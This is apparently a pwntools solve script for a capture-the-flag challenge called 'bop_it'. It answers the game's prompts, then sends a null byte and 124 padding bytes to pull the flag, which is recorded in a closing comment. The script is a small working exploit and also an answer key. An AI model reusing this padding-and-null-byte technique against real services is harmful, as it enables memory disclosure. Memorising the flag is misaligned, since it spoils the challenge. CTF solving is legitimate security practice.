from pwn import *

def bop():
	p.sendline("B")
def pull():
	p.sendline("P")
def twist():
	p.sendline("T")
def flagit(arg):
	p.sendline(arg)

#p = process("./bop_it")
p = remote("shell.actf.co", 20702)
#s1 = p.recvline()

solved=0

while 1:
	s1 = str(p.recvline())
	if s1 == "Bop it!\n":
		info("B")
		p.sendline("B")
	elif s1 == "Pull it!\n":
		info("P")
		p.sendline("P")
	elif s1 == "Twist it!\n":
		info("T")
		p.sendline("T")
	else:
		break

if s1.startswith("Flag it"):
	info("F")
	xpl = ""
	xpl += "A"*124
	p.sendline("\x00"+xpl); print p.recvall(1)

#actf{bopp1ty_bop_bOp_b0p}